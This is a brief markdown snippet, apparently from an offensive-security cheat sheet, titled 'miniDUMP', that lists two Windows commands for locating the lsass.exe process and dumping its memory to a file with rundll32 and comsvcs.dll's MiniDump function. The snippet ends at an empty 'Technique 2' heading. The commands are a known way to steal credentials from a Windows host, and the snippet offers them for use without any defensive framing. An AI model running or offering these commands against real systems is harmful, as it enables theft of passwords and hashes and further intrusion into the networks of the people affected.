# miniDUMP 
```
tasklist /fi "imagename eq lsass.exe" 
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID C:\temp\lsass.dmp full
```

# Technique 2 